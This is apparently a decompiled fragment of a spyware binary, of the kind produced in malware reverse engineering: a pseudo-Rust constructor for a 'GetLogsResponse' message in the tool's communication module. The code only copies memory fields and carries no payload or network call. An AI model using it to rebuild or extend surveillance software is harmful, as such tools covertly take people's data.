
  fn spyware::communication::messages::Message::GetLogsResponse::hd97008268b60995e(arg1: *mut i64, arg2: *mut i128) -> i64

{
    let result: i64 = arg2[3];
    arg1[7] = result;
    let zmm0: i128 = *arg2;
    let zmm1: i128 = arg2[1];
    *arg1.byte_offset(0x28) = arg2[2];
    *arg1.byte_offset(0x18) = zmm1;
    *arg1.byte_offset(8) = zmm0;
    *arg1 = -0x7ffffffffffffff9;
    result
}
